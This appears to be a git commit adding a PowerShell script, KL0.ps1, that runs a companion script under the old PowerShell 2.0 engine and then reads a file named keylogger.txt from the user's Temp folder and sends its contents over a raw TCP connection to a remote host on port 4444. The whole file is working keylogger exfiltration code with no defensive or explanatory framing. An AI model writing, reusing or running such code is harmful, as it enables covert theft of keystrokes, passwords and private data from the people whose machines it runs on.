596e58ef02543835b7afd8746ba10f6f7c2651a8
Kevin <95182483+KevinRahmani@users.noreply.github.com>
2024-06-12 14:12:36 +0200

    Add files via upload

---
+++ KL0.ps1
@@ -0,0 +1,14 @@
+Start-Process powershell.exe -ArgumentList "-Version 2.0 -Command `C:\Users\Arendt\KL1.ps1" -NoNewWindow -wait
+
+$filePath = "C:\Users\Arendt\AppData\Local\Temp\keylogger.txt"
+$remoteIP = "10.0.48.139"
+$remotePort = 4444
+$tcpClient = New-Object System.Net.Sockets.TcpClient
+$tcpClient.Connect($remoteIP, $remotePort)
+$fileContent = Get-Content -Path $filePath -Raw
+$bytes = [System.Text.Encoding]::ASCII.GetBytes($fileContent)
+$networkStream = $tcpClient.GetStream()
+$networkStream.Write($bytes, 0, $bytes.Length)
+$networkStream.Close()
+$tcpClient.Close()
+#Write-Output "File content sent to $remoteIP on port $remotePort"
